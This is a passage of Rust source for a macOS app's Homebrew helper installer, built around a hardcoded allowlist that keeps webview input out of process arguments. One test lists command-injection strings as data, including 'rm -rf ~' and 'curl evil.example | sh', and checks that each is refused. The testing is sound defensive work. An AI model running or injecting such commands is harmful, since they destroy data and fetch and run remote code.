//! Installing the optional helpers - and the allowlist that keeps the webview out of `argv`.
//!
//! One install is one [`Package`], never one binary. The frontend may ask for a package *by id*. It
//! can never say what to run: an id is only ever compared against
//! [`crate::package::ALL_PACKAGES`], and every command line in this file is a
//! `&'static [&'static str]` written here in the source. Nothing that arrives over IPC can reach a
//! process argument - not by concatenation, not through a shell, because there is no shell and no
//! `String` anywhere in [`Recipe`]. An IPC surface that accepted a command string would be a
//! remote-code-execution hole reachable from any page the webview ever loads.
//!
//! What a tool *unlocks* is computed from [`crate::format::catalog`], so it cannot drift: adding a
//! format that needs Pandoc changes what the settings page promises Pandoc will do.

use crate::format::{catalog, Category, Format, Support, Tool};
use crate::package::{Package, ALL_PACKAGES};
use crate::tools::{is_executable, ALL_TOOLS};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// One hardcoded install command line.
///
/// `args` is deliberately `&'static [&'static str]`: a value built from IPC input cannot be stored
/// here without leaking it first, so the type system - not a review comment - is what guarantees
/// the webview never contributes an argument.
#[derive(Debug, Clone, Copy)]
pub struct Recipe {
    /// What the user is installing. One recipe per package: three Poppler binaries, one `brew
    /// install poppler`, one row on the settings page.
    pub package: &'static Package,
    pub args: &'static [&'static str],
    /// Casks install into `/Applications`, which can ask for an administrator password.
    pub needs_admin: bool,
}

/// A package manager this app knows how to drive.
///
/// Everything platform-specific about installing lives in one of these, so adding `winget` or
/// `choco` later is a new constant plus one arm in [`platform_manager`] - not a second code path
/// through the command layer.
#[derive(Debug)]
pub struct PackageManager {
    /// Stable id the frontend sees in [`PackageInstallPlan::manager`].
    pub id: &'static str,
    pub label: &'static str,
    /// Program name as we *show* it ("brew install pandoc"). We always execute an absolute path.
    pub program: &'static str,
    /// Absolute locations to probe, in priority order. `PATH` is a fallback, never the first try:
    /// a GUI app launched from Finder inherits a minimal `PATH` that contains none of these.
    pub candidates: &'static [&'static str],
    /// Where the user goes to install the manager itself. We never install it for them: that needs
    /// sudo and rewrites `/opt`, which is far too invasive to do on a button press.
    pub home_page: &'static str,
    /// Environment the installer must run with (see [`HOMEBREW`] for why each one is here).
    pub env: &'static [(&'static str, &'static str)],
    /// The allowlist: every tool this manager may install, and exactly how.
    pub recipes: &'static [Recipe],
}

/// [`PackageInstallPlan::manager`] when nothing can install a package on this platform.
pub const NO_MANAGER: &str = "none";

/// Homebrew. The command strings here are the same ones [`Tool::install_hint`] shows in the UI -
/// `the_command_we_run_is_the_command_we_show` keeps the two from drifting apart.
pub const HOMEBREW: PackageManager = PackageManager {
    id: "homebrew",
    label: "Homebrew",
    program: "brew",
    // Apple Silicon first, then Intel. Homebrew is deliberately not searched for anywhere else:
    // a `brew` picked up from a user-writable directory would be an install of our own making.
    candidates: &["/opt/homebrew/bin/brew", "/usr/local/bin/brew"],
    home_page: "https://brew.sh",
    env: &[
        // There is no terminal behind this process. `NONINTERACTIVE` makes brew fail fast instead
        // of blocking forever on a question nobody can answer.
        ("NONINTERACTIVE", "1"),
        // Plain text: every line becomes a `log` event the UI renders itself.
        ("HOMEBREW_NO_COLOR", "1"),
        ("HOMEBREW_NO_ENV_HINTS", "1"),
        // The app promises that nothing leaves the machine; that includes install telemetry.
        ("HOMEBREW_NO_ANALYTICS", "1"),
    ],
    recipes: &[
        Recipe {
            package: &crate::package::LIBREOFFICE,
            args: &["install", "--cask", "libreoffice"],
            needs_admin: true,
        },
        Recipe {
            package: &crate::package::PANDOC,
            args: &["install", "pandoc"],
            needs_admin: false,
        },
        Recipe {
            package: &crate::package::IMAGEMAGICK,
            args: &["install", "imagemagick"],
            needs_admin: false,
        },
        // One formula for all three Poppler binaries, so one recipe: which of them the machine is
        // actually missing is a diagnostic, not a different install.
        Recipe {
            package: &crate::package::POPPLER,
            args: &["install", "poppler"],
            needs_admin: false,
        },
        Recipe {
            package: &crate::package::RUFFLE,
            args: &["install", "--cask", "ruffle"],
            needs_admin: true,
        },
        Recipe {
            package: &crate::package::YT_DLP,
            args: &["install", "yt-dlp"],
            needs_admin: false,
        },
        // `brew info deno`: formula `deno`, bottled, so this is a download rather than a build.
        Recipe { package: &crate::package::DENO, args: &["install", "deno"], needs_admin: false },
    ],
};

/// Every manager this build knows how to drive, whatever platform it is running on.
///
/// Used to answer "could *anything* install this?" - which is what separates "install Homebrew
/// first" from "there is nothing to install" (FFmpeg is bundled, `sips` is part of macOS).
pub const ALL_MANAGERS: &[&PackageManager] = &[&HOMEBREW];

/// Whether any known manager can install `package`.
pub fn package_is_installable(package: &Package) -> bool {
    ALL_MANAGERS.iter().any(|m| m.recipe(package).is_some())
}

/// Whether this binary arrives with a package something can install.
///
/// False for the bundled engine and for macOS `sips`, on every platform: "FFmpeg ships with the app"
/// is not a fact about whether this machine has Homebrew.
pub fn is_installable(tool: Tool) -> bool {
    tool.package().is_some_and(package_is_installable)
}

/// The manager for the platform this build runs on, if there is one.
///
/// macOS only for now, by choice: `winget`/`choco` slot in here as extra arms once the Windows
/// build exists. Everywhere else the settings page shows the command and lets the user run it.
pub fn platform_manager() -> Option<&'static PackageManager> {
    #[cfg(target_os = "macos")]
    {
        Some(&HOMEBREW)
    }
    #[cfg(not(target_os = "macos"))]
    {
        None
    }
}

impl PackageManager {
    /// The recipe for `package`, or `None` when this manager must not install it.
    pub fn recipe(&self, package: &Package) -> Option<&'static Recipe> {
        self.recipes.iter().find(|r| r.package.id == package.id)
    }

    /// The command as a human reads it, e.g. `brew install --cask libreoffice`.
    pub fn command(&self, recipe: &Recipe) -> String {
        let mut out = String::from(self.program);
        for arg in recipe.args {
            out.push(' ');
            out.push_str(arg);
        }
        out
    }

    /// Where this manager is installed, if it is at all.
    pub fn locate(&self) -> Option<PathBuf> {
        self.locate_with(&|p: &Path| is_executable(p))
    }

    /// Same as [`Self::locate`] with an injectable filesystem probe (used by tests, which run on
    /// machines that have no Homebrew).
    pub fn locate_with(&self, probe: &dyn Fn(&Path) -> bool) -> Option<PathBuf> {
        for candidate in self.candidates {
            let path = PathBuf::from(candidate);
            if probe(&path) {
                return Some(path);
            }
        }
        // Only now `PATH`, for the unusual install (a custom `HOMEBREW_PREFIX`). A GUI app started
        // from Finder often has nothing useful in here, which is why it comes last, not first.
        let path = std::env::var_os("PATH")?;
        std::env::split_paths(&path).map(|d| d.join(self.program)).find(|p| probe(p))
    }
}

/// The allowlist gate. An id from the webview is *compared* against the package table and then
/// thrown away: what comes out is a [`Package`], which is what everything downstream takes.
pub fn package_by_id(id: &str) -> Option<&'static Package> {
    Package::by_id(id)
}

/// The same lookup for a *binary* id, which the install path never accepts - it exists so a
/// diagnostic can tell "that is not a helper at all" from "that is bundled, there is nothing to do".
pub fn tool_by_id(id: &str) -> Option<Tool> {
    ALL_TOOLS.iter().copied().find(|t| t.id() == id)
}

/// A resolved, ready-to-spawn install command. Only [`resolve_install_with`] builds one.
#[derive(Debug, Clone)]
pub struct InstallCommand {
    /// What is being installed, as a user would name it.
    pub package: &'static Package,
    /// Absolute path to the package manager as found on disk - never a name resolved via `PATH`.
    pub program: PathBuf,
    /// Fixed argv from the allowlist (see [`Recipe::args`] for why these are `'static`).
    pub args: Vec<&'static str>,
    pub env: Vec<(&'static str, &'static str)>,
    pub needs_admin: bool,
    /// What we tell the user we are running, and what we tell them to run themselves if it fails.
    pub display: String,
}

/// Resolve a package id from the frontend into a command, on this machine.
pub fn resolve_install(package_id: &str) -> Result<InstallCommand, String> {
    let manager = platform_manager();
    let located = manager.and_then(|m| m.locate());
    resolve_install_with(package_id, manager, located)
}

/// Same as [`resolve_install`] with the platform answers injected, so every refusal path is
/// testable on a machine with no package manager at all.
///
/// The four refusals are deliberately different messages: "you sent nonsense", "not on this
/// platform", "nothing to install", and "install Homebrew first" need four different actions from
/// the user, and a single generic error would leave them stuck.
pub fn resolve_install_with(
    package_id: &str,
    manager: Option<&'static PackageManager>,
    manager_path: Option<PathBuf>,
) -> Result<InstallCommand, String> {
    let Some(package) = package_by_id(package_id) else {
        // A *binary* id gets the answer it deserves rather than "not a helper". Two different
        // answers, because they need two different things from the caller: `pdftotext` is a member
        // of a package that *is* installable and was simply asked for by the wrong key, while
        // `ffmpeg` is bundled and `sips` is part of macOS - true on every machine, and not a
        // platform problem. Asked before anything platform-specific, for exactly that reason.
        if let Some(tool) = tool_by_id(package_id) {
            return Err(match tool.package() {
                Some(package) => format!(
                    "{name} is installed as one package, not one program at a time - ask for \
                     {name} ({hint}).",
                    name = package.name,
                    hint = install_hint(package),
                ),
                None => format!(
                    "There is nothing to install: {name} - {hint}",
                    name = tool.user_facing_name(),
                    hint = tool.install_hint(),
                ),
            });
        }
        return Err(format!("`{}` is not a helper Flint can install.", printable(package_id)));
    };
    let name = package.name;
    let hint = install_hint(package);
    let Some(manager) = manager else {
        return Err(format!(
            "Automatic helper installation is available on macOS (with Homebrew). \
             Install {name} yourself - {hint} - then click Re-check.",
        ));
    };
    let Some(recipe) = manager.recipe(package) else {
        return Err(format!("{manager} cannot install {name} - {hint}", manager = manager.label));
    };
    let display = manager.command(recipe);
    let Some(program) = manager_path else {
        return Err(format!(
            "{manager} is not installed, so Flint cannot install {name} for you. \
             Install {manager} from {page} first (it will ask for your password in Terminal), then \
             come back and click Install - or run `{display}` in Terminal yourself.",
            manager = manager.label,
            page = manager.home_page,
        ));
    };
    Ok(InstallCommand {
        package,
        program,
        args: recipe.args.to_vec(),
        env: manager.env.to_vec(),
        needs_admin: recipe.needs_admin,
        display,
    })
}

/// The one-line "or do it yourself" for a package: its own command where one exists, and otherwise
/// whatever its first binary has to say (a platform with no manager we drive).
fn install_hint(package: &Package) -> &'static str {
    package.tools.first().copied().map(Tool::install_hint).unwrap_or("")
}

/// One row on the settings page: a package, the command that installs it, and why the user cares.
///
/// Per *package*, not per binary: three near-identical Poppler rows with the same `brew install
/// poppler` behind each was noise in a list whose whole premise is restraint, and it invited the app
/// to ask for "pdftohtml" by name. Presence is not here at all - it belongs to the tools
/// ([`crate::ToolStatus`]), and the UI derives a package's state from the members named in
/// `tool_ids`. A package with some of its binaries missing is *not installed* and still installable.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackageInstallPlan {
    /// Stable id, and the only thing the frontend sends back to start an install.
    pub package_id: String,
    /// The display name every user-facing string uses.
    pub name: String,
    /// The binaries this package provides; each matches a [`crate::ToolStatus::id`], so the UI can
    /// join the two lists and see that a package is half-installed.
    pub tool_ids: Vec<String>,
    /// [`PackageManager::id`], or [`NO_MANAGER`].
    pub manager: String,
    /// Whether that manager is actually installed on this machine.
    pub manager_available: bool,
    /// The exact command, for the "or run this yourself" line. Empty when there is no manager.
    pub command: String,
    pub needs_admin: bool,
    pub can_auto_install: bool,
    pub unlocks: Vec<String>,
}

/// One plan per installable package, on this machine.
pub fn install_plans() -> Vec<PackageInstallPlan> {
    let manager = platform_manager();
    let available = manager.and_then(|m| m.locate()).is_some();
    install_plans_with(manager, available)
}

/// Same as [`install_plans`] with the platform answers injected (tests, and any future "pretend
/// the manager is missing" diagnostic).
pub fn install_plans_with(
    manager: Option<&'static PackageManager>,
    manager_available: bool,
) -> Vec<PackageInstallPlan> {
    ALL_PACKAGES
        .iter()
        .copied()
        .map(|package| {
            let recipe = manager.and_then(|m| m.recipe(package));
            let (manager_id, command, needs_admin) = match (manager, recipe) {
                (Some(manager), Some(recipe)) => {
                    (manager.id, manager.command(recipe), recipe.needs_admin)
                }
                // A platform with no manager we know how to drive: the row still says what the
                // package is for, and the hint tells the user how to get it themselves.
                _ => (NO_MANAGER, String::new(), false),
            };
            PackageInstallPlan {
                package_id: package.id.into(),
                name: package.name.into(),
                tool_ids: package.tools.iter().map(|t| t.id().to_string()).collect(),
                manager: manager_id.into(),
                manager_available: manager_available && manager_id != NO_MANAGER,
                command,
                needs_admin,
                // Nothing to auto-install with when the manager itself is missing; the UI shows the
                // command and a link instead of a button that cannot work.
                can_auto_install: manager_available && manager_id != NO_MANAGER,
                // One derivation over every member, so Poppler reads as one coherent set of
                // sentences instead of three stacked lists that repeat each other.
                unlocks: unlocks_for(package.tools),
            }
        })
        .collect()
}

/// Every format that declares `tool` in either direction, in catalog order.
///
/// This is the raw answer to "what does this helper buy me"; [`unlocks`] is the same thing phrased
/// for the settings page.
pub fn unlocked_formats(tool: Tool) -> Vec<&'static Format> {
    catalog()
        .iter()
        .filter(|f| f.read.helpers().contains(&tool) || f.write.helpers().contains(&tool))
        .collect()
}

/// What one helper binary buys the user, in plain words. [`unlocks_for`] over a set of one.
pub fn unlocks(tool: Tool) -> Vec<String> {
    unlocks_for(&[tool])
}

/// What a *set* of helpers buys the user, in plain words, derived from the catalog.
///
/// Not a hand-written table: a table would quietly start lying the first time a format is added.
///
/// The set is what makes a package readable. Poppler is three binaries, and stacking three
/// finished lists would repeat itself - "Open documents: PDF" three times, and, for any package
/// whose members split a category between them, an "Open documents: …" and a "Save documents: …"
/// that overlap. So the derivation is done *once* over every member: both the "which formats
/// declare this" filter ([`declaring`]) and the "also handled by" note ([`also_handled_by`]) accept
/// any member of the set, and each format is therefore named exactly once, in catalog order.
fn unlocks_for(tools: &[Tool]) -> Vec<String> {
    // Nothing installs the bundled engine, so it is never a member of a package: a set containing
    // it is a single bundled tool being asked about on its own.
    if tools.iter().copied().any(Tool::is_bundled) {
        return vec![bundled_sentence()];
    }
    // yt-dlp unlocks a *source*, not a format: no catalog entry names it, and the derivation below
    // would therefore promise nothing at all. What it buys is stated here because there is nowhere
    // else it could be derived from - and it is still derived from one fact, the link cap.
    if tools.contains(&Tool::YtDlp) {
        return vec![format!(
            "Convert YouTube and Bilibili video links, or QQ Music, NetEase Music, SoundCloud \
             and Bandcamp tracks (up to {} links at a time).",
            crate::link::MAX_LINKS_PER_BATCH
        )];
    }
    // A JavaScript runtime unlocks no format either, and what it buys cannot be derived from the
    // catalog for the same reason: it is what keeps a YouTube *fetch* working. Asked after yt-dlp,
    // because a set holding both is being asked about links.
    if tools.iter().copied().any(|t| t.js_runtime_name().is_some()) {
        return vec![
            "Keeps YouTube links working: yt-dlp needs a JavaScript runtime for YouTube's \
             challenges, and without one YouTube asks for a sign-in instead of handing the video \
             over."
                .to_string(),
        ];
    }
    let mut out = Vec::new();
    for category in Category::ALL {
        let reads = declaring(category, tools, |f| f.read);
        let writes = declaring(category, tools, |f| f.write);
        if reads.is_empty() && writes.is_empty() {
            continue;
        }
        let subject = plural(category);
        if ids(&reads) == ids(&writes) {
            out.push(format!("Open and save {subject}: {}", listing(&reads)));
        } else {
            if !reads.is_empty() {
                out.push(format!("Open {subject}: {}", listing(&reads)));
            }
            if !writes.is_empty() {
                out.push(format!("Save {subject}: {}", listing(&writes)));
            }
        }
    }
    // Honest about alternatives: ImageMagick reads iPhone photos, but so does the `sips` every Mac
    // already has - a user should not install 300 MB for something they already own.
    let shared = also_handled_by(tools);
    if !shared.is_empty() {
        out.push(format!("Some of these also work with {}", join(&shared, "or")));
    }
    out
}

/// Formats in `category` whose `direction` lists *any* of `tools`.
///
/// Catalog order, and one entry per format however many members declare it - which is what keeps a
/// package's sentences free of the same format twice.
fn declaring(
    category: Category,
    tools: &[Tool],
    direction: impl Fn(&Format) -> Support,
) -> Vec<&'static Format> {
    catalog()
        .iter()
        .filter(|f| {
            f.category == category && direction(f).helpers().iter().any(|h| tools.contains(h))
        })
        .collect()
}

fn ids(formats: &[&'static Format]) -> Vec<&'static str> {
    formats.iter().map(|f| f.id).collect()
}

/// Catalog *names* ("Word (docx)"), never ids: `json_doc` and `pdf_page` mean nothing to a user.
/// Long lists are cut short - the settings page is not the format reference.
fn listing(formats: &[&'static Format]) -> String {
    const SHOWN: usize = 6;
    let names: Vec<&'static str> = formats.iter().take(SHOWN).map(|f| f.name).collect();
    let rest = formats.len() - names.len();
    if rest == 0 {
        join(&names, "and")
    } else {
        format!("{} and {rest} more", names.join(", "))
    }
}

/// Other helpers that appear alongside *any* of `tools` in the catalog, named as a user would name
/// them, in [`ALL_TOOLS`] order so the sentence is stable however the catalog is reordered.
///
/// Two names collapsing into one is the point: the three binaries the `pdf` entry lists alongside
/// each other are all Poppler, and "also works with Poppler, Poppler or ImageMagick" is not a
/// sentence. Members of the set itself are never mentioned - a package does not also work with
/// itself.
fn also_handled_by(tools: &[Tool]) -> Vec<&'static str> {
    let mut others: Vec<Tool> = Vec::new();
    for format in catalog() {
        for support in [format.read, format.write] {
            let helpers = support.helpers();
            if !helpers.iter().any(|h| tools.contains(h)) {
                continue;
            }
            for other in helpers.iter().copied().filter(|t| !tools.contains(t)) {
                if !others.contains(&other) {
                    others.push(other);
                }
            }
        }
    }
    let mut names: Vec<&'static str> = Vec::new();
    for name in ALL_TOOLS.iter().filter(|t| others.contains(t)).map(|t| t.user_facing_name()) {
        if !names.contains(&name) {
            names.push(name);
        }
    }
    names
}

/// What the bundled engine already covers, derived from the formats marked [`Support::Bundled`].
fn bundled_sentence() -> String {
    let covered: Vec<&'static str> = Category::ALL
        .iter()
        .copied()
        .filter(|c| {
            catalog().iter().any(|f| {
                f.category == *c
                    && (matches!(f.read, Support::Bundled) || matches!(f.write, Support::Bundled))
            })
        })
        .map(plural)
        .collect();
    format!("Already included in the app: {}", join(&covered, "and"))
}

/// How to say a category out loud. Exhaustive on purpose: a new category is a compile error here,
/// not a silently missing sentence.
fn plural(category: Category) -> &'static str {
    match category {
        Category::Video => "video files",
        Category::Audio => "audio files",
        Category::Image => "images",
        Category::Document => "documents",
        Category::Subtitle => "subtitles",
        Category::Flash => "Flash movies",
    }
}

/// `a, b and c` / `a, b or c`.
fn join(parts: &[&str], conjunction: &str) -> String {
    match parts {
        [] => String::new(),
        [only] => (*only).to_string(),
        [rest @ .., last] => format!("{} {conjunction} {last}", rest.join(", ")),
    }
}

/// An id we are about to echo back into an error message. Control characters would let a crafted id
/// smuggle escape sequences into a log or a toast, and an unbounded one would spam both.
fn printable(raw: &str) -> String {
    let cleaned: String = raw
        .chars()
        .filter(|c| !c.is_control())
        .map(|c| if c == '`' { '\'' } else { c })
        .take(40)
        .collect();
    if cleaned.is_empty() {
        "(empty)".to_string()
    } else {
        cleaned
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::package::{Presence, POPPLER};
    use crate::ToolRegistry;

    fn fake_brew() -> PathBuf {
        PathBuf::from("/opt/homebrew/bin/brew")
    }

    fn plan_for<'a>(plans: &'a [PackageInstallPlan], id: &str) -> &'a PackageInstallPlan {
        plans.iter().find(|p| p.package_id == id).expect("plan for package")
    }

    /// The hint in the format catalog is what the UI tells the user to type; the recipe is what we
    /// actually run. If they ever differ, one of the two is a lie.
    ///
    /// Checked per package *and* per member binary: `brew install poppler` is the answer whichever
    /// of the three the planner went looking for, so all three hints have to name it.
    #[test]
    fn the_command_we_run_is_the_command_we_show() {
        for package in ALL_PACKAGES.iter().copied() {
            let recipe = HOMEBREW.recipe(package).expect("every package has a recipe");
            assert_eq!(HOMEBREW.command(recipe), install_hint(package), "{}", package.id);
            for tool in package.tools {
                assert_eq!(
                    tool.install_hint(),
                    install_hint(package),
                    "{} shows something other than the command that installs {}",
                    tool.id(),
                    package.id
                );
            }
        }
        // ...and a tool nothing installs must not show a command we would never run.
        for tool in ALL_TOOLS.iter().copied().filter(|t| t.package().is_none()) {
            assert!(
                !tool.install_hint().starts_with("brew "),
                "{} shows a brew command but belongs to no package",
                tool.id()
            );
        }
    }

    /// Belt and braces on the allowlist itself. Every argv must stay a plain "install this named
    /// package": no paths, no shell metacharacters, no flags we did not mean, and never an attempt
    /// to bootstrap the package manager (that needs sudo and rewrites `/opt` - far too invasive to
    /// do because somebody clicked a button).
    #[test]
    fn every_recipe_is_a_plain_install_of_a_named_package() {
        for manager in ALL_MANAGERS {
            for recipe in manager.recipes {
                // The recipe table and the package table are one allowlist, not two: a recipe for
                // something `Package::by_id` cannot reach would be unreachable from IPC, and a
                // recipe for something it reaches *twice* would make the lookup order matter.
                assert_eq!(
                    Package::by_id(recipe.package.id).map(|p| p.id),
                    Some(recipe.package.id),
                    "{} is not in the package table",
                    recipe.package.id
                );
                assert_eq!(
                    manager.recipes.iter().filter(|r| r.package.id == recipe.package.id).count(),
                    1,
                    "{} has more than one recipe",
                    recipe.package.id
                );
                for tool in recipe.package.tools {
                    assert!(!tool.is_bundled(), "{} ships with the app", tool.id());
                }
                assert_eq!(recipe.args.first(), Some(&"install"), "{:?}", recipe.args);
                assert!(recipe.args.len() <= 3, "{:?} is doing more than one thing", recipe.args);
                for arg in recipe.args {
                    assert!(
                        !arg.is_empty()
                            && arg.chars().all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c)),
                        "`{arg}` is not a bare flag or package name"
                    );
                    assert!(
                        !arg.contains("homebrew") && !arg.contains("brew"),
                        "`{arg}`: the manager never installs itself"
                    );
                }
                // A cask goes into /Applications and may need a password; a formula never does.
                assert_eq!(
                    recipe.needs_admin,
                    recipe.args.contains(&"--cask"),
                    "{:?} disagrees with itself about needing an administrator",
                    recipe.args
                );
            }
        }
    }

    /// The whole point of the allowlist: the webview names a *package*, never a command.
    #[test]
    fn a_crafted_package_id_is_refused_before_anything_can_run() {
        for crafted in [
            "libreoffice; rm -rf ~",
            "libreoffice && curl evil.example | sh",
            "libreoffice\nrm -rf /",
            "$(whoami)",
            "`id`",
            "--cask",
            "install",
            "brew",
            "LibreOffice",
            "libreoffice ",
            "poppler;rm -rf ~",
            "../../../bin/sh",
            "",
        ] {
            assert!(package_by_id(crafted).is_none(), "`{crafted}` must not resolve to a package");
            assert!(tool_by_id(crafted).is_none(), "`{crafted}` must not resolve to a tool");
            let err = resolve_install_with(crafted, Some(&HOMEBREW), Some(fake_brew()))
                .expect_err("a crafted id must be refused");
            assert!(err.contains("is not a helper"), "{err}");
            // Whatever came in never comes back out as something a terminal could act on: the two
            // backticks are the ones this message puts around the id itself.
            assert!(!err.contains('\n'), "{err}");
            assert_eq!(err.matches('`').count(), 2, "{err}");
        }
    }

    #[test]
    fn a_known_id_resolves_to_a_fixed_argv() {
        let cmd = resolve_install_with("libreoffice", Some(&HOMEBREW), Some(fake_brew()))
            .expect("libreoffice is installable");
        assert_eq!(cmd.package.id, "libreoffice");
        assert_eq!(cmd.program, fake_brew());
        assert_eq!(cmd.args, ["install", "--cask", "libreoffice"]);
        assert_eq!(cmd.display, "brew install --cask libreoffice");
        assert!(cmd.needs_admin, "a cask lands in /Applications and may ask for a password");
        assert!(cmd.env.iter().any(|(k, v)| *k == "NONINTERACTIVE" && *v == "1"));

        let pandoc = resolve_install_with("pandoc", Some(&HOMEBREW), Some(fake_brew()))
            .expect("pandoc is installable");
        assert_eq!(pandoc.args, ["install", "pandoc"]);
        assert!(!pandoc.needs_admin, "a formula needs no password");

        // One package, three binaries, one command - and the command is keyed by the package.
        let poppler = resolve_install_with("poppler", Some(&HOMEBREW), Some(fake_brew()))
            .expect("poppler is installable");
        assert_eq!(poppler.package.tools, POPPLER.tools);
        assert_eq!(poppler.args, ["install", "poppler"]);
    }

    /// "FFmpeg is bundled" and "sips is part of macOS" are true everywhere, so the answer must not
    /// depend on whether this machine happens to have a package manager.
    #[test]
    fn nothing_is_offered_for_a_tool_that_cannot_be_installed() {
        for id in ["ffmpeg", "ffprobe", "sips"] {
            assert!(!is_installable(tool_by_id(id).expect("known tool")), "{id}");
            for manager in [Some(&HOMEBREW), None] {
                let err = resolve_install_with(id, manager, Some(fake_brew()))
                    .expect_err("there is nothing to install");
                assert!(err.contains("nothing to install"), "{err}");
            }
        }
        for id in ["libreoffice", "pandoc", "magick", "pdftoppm", "ruffle", "yt-dlp"] {
            assert!(is_installable(tool_by_id(id).expect("known tool")), "{id}");
        }
    }

    /// A *member binary's* id is not an install key, and refusing it with "there is nothing to
    /// install" would be a lie - `brew install poppler` is exactly what would fix a missing
    /// `pdftohtml`. The answer names the package to ask for instead.
    #[test]
    fn a_member_binary_is_not_an_install_key_but_its_package_is() {
        for id in ["pdftoppm", "pdftotext", "pdftohtml"] {
            let err = resolve_install_with(id, Some(&HOMEBREW), Some(fake_brew()))
                .expect_err("an install is keyed by package");
            assert!(err.contains("Poppler is installed as one package"), "{err}");
            assert!(err.contains("brew install poppler"), "{err}");
            assert!(!err.contains("nothing to install"), "there is something to install: {err}");
        }
        assert!(resolve_install_with("poppler", Some(&HOMEBREW), Some(fake_brew())).is_ok());
    }

    /// Homebrew missing is the common case on a fresh Mac, and "No such file or directory" is not
    /// an answer. We must never try to install Homebrew itself - that needs sudo.
    #[test]
    fn a_missing_manager_says_what_to_do_instead() {
        let err = resolve_install_with("pandoc", Some(&HOMEBREW), None)
            .expect_err("nothing can be installed without brew");
        assert!(err.contains("Homebrew is not installed"), "{err}");
        assert!(err.contains("https://brew.sh"), "{err}");
        assert!(err.contains("brew install pandoc"), "{err}");
        assert!(err.contains("Terminal"), "{err}");
    }

    #[test]
    fn a_platform_without_a_manager_points_at_the_manual_route() {
        let err = resolve_install_with("pandoc", None, None).expect_err("no manager, no install");
        assert!(err.contains("macOS"), "{err}");
        assert!(err.contains("brew install pandoc"), "{err}");
    }

    #[test]
    fn homebrew_is_looked_for_where_it_actually_lives() {
        // Apple Silicon.
        assert_eq!(
            HOMEBREW.locate_with(&|p| p == Path::new("/opt/homebrew/bin/brew")),
            Some(PathBuf::from("/opt/homebrew/bin/brew"))
        );
        // Intel.
        assert_eq!(
            HOMEBREW.locate_with(&|p| p == Path::new("/usr/local/bin/brew")),
            Some(PathBuf::from("/usr/local/bin/brew"))
        );
        // Apple Silicon wins when both are there (a migrated machine keeps the Intel copy).
        assert_eq!(
            HOMEBREW.locate_with(&|_| true).as_deref(),
            Some(Path::new("/opt/homebrew/bin/brew"))
        );
        assert_eq!(HOMEBREW.locate_with(&|_| false), None);
    }

    /// A GUI app launched from Finder has almost nothing in `PATH`, so the absolute candidates -
    /// not `PATH` - are what must find Homebrew.
    #[test]
    fn homebrew_is_found_with_an_empty_path() {
        let found = HOMEBREW.locate_with(&|p| {
            assert!(!p.to_string_lossy().contains("/nowhere"), "PATH should not be needed");
            p == Path::new("/opt/homebrew/bin/brew")
        });
        assert!(found.is_some());
    }

    #[test]
    fn plans_cover_every_package_and_join_the_status_list() {
        let plans = install_plans_with(Some(&HOMEBREW), true);
        assert_eq!(plans.len(), ALL_PACKAGES.len());
        assert_eq!(
            plans.iter().map(|p| p.package_id.as_str()).collect::<Vec<_>>(),
            ALL_PACKAGES.iter().map(|p| p.id).collect::<Vec<_>>(),
            "the settings page lists packages in package-table order"
        );

        // `tool_ids` must be joinable with what `refresh_tools` returns - that is where the UI
        // reads *whether* each member is there, and therefore whether the package is complete.
        let status_ids: Vec<String> =
            crate::ToolRegistry::default().statuses().iter().map(|s| s.id.to_string()).collect();
        for plan in &plans {
            assert!(!plan.tool_ids.is_empty(), "{} promises nothing", plan.package_id);
            for id in &plan.tool_ids {
                assert!(status_ids.contains(id), "`{id}` is not in the status list");
            }
            assert!(!plan.unlocks.is_empty(), "{} has nothing to say", plan.package_id);
        }
        // Every installable binary belongs to exactly one row, so no user has to choose between
        // two buttons that run the same command.
        for tool in ALL_TOOLS.iter().copied().filter(|t| is_installable(*t)) {
            let owners: Vec<&str> = plans
                .iter()
                .filter(|p| p.tool_ids.iter().any(|id| id == tool.id()))
                .map(|p| p.package_id.as_str())
                .collect();
            assert_eq!(owners.len(), 1, "{} is offered by {owners:?}", tool.id());
        }

        let office = plan_for(&plans, "libreoffice");
        assert_eq!(office.name, "LibreOffice");
        assert_eq!(office.manager, "homebrew");
        assert!(office.manager_available && office.can_auto_install && office.needs_admin);
        assert_eq!(office.command, "brew install --cask libreoffice");

        let poppler = plan_for(&plans, "poppler");
        assert_eq!(poppler.command, "brew install poppler");
        assert!(!poppler.needs_admin);
    }

    /// Poppler is one thing a user installs, whatever it drops into `/opt/homebrew/bin`. The offer
    /// therefore has to promise everything *any* of its binaries buys - a row that only listed
    /// `pdftoppm`'s formats would undersell the install, and a row per binary would ask the user to
    /// pick between three identical `brew install poppler` buttons.
    #[test]
    fn a_package_plan_unions_what_its_members_unlock() {
        let plans = install_plans_with(Some(&HOMEBREW), true);
        let poppler: Vec<&PackageInstallPlan> =
            plans.iter().filter(|p| p.command == "brew install poppler").collect();
        assert_eq!(poppler.len(), 1, "one offer per package, not one per binary");
        let plan = poppler[0];
        assert_eq!(plan.package_id, "poppler");
        assert_eq!(plan.name, "Poppler");
        assert_eq!(plan.tool_ids, ["pdftoppm", "pdftotext", "pdftohtml"]);

        for tool in [Tool::PdfToPpm, Tool::PdfToText, Tool::PdfToHtml] {
            for format in unlocked_formats(tool) {
                assert!(
                    plan.unlocks.iter().any(|line| line.contains(format.name)),
                    "{} unlocks {} and the Poppler offer does not mention it: {:?}",
                    tool.id(),
                    format.name,
                    plan.unlocks
                );
            }
        }
        // Nothing a user reads names the executable: they install Poppler, not `pdftohtml`.
        for line in &plan.unlocks {
            assert!(!line.contains("pdfto"), "`{line}` names a binary");
        }
    }

    /// The union is one *derivation* over the members, not three finished lists concatenated.
    ///
    /// Stacking them would repeat every sentence the members share (and, where members split a
    /// category, produce an "Open documents: …" and a "Save documents: …" that overlap), so the
    /// property is stated the way a reader would notice it: no sentence is made twice about the same
    /// category, and no format is named twice inside one.
    #[test]
    fn a_package_offer_names_each_format_once() {
        /// Every name a line lists, the way a reader picks them out: the part after the colon, split
        /// on its commas and its final "and". Substring matching would not do - "PDF" appears inside
        /// "PDF page (as image)", which is a different format.
        fn names_listed(line: &str) -> Vec<&str> {
            let listed = line.split_once(": ").map(|(_, rest)| rest).unwrap_or(line);
            listed
                .split(", ")
                .flat_map(|part| part.split(" and "))
                .map(str::trim)
                .filter(|part| !part.is_empty())
                .collect()
        }
        /// "Open images", "Save images", "Open and save documents" - the thing a line is about.
        fn subject(line: &str) -> &str {
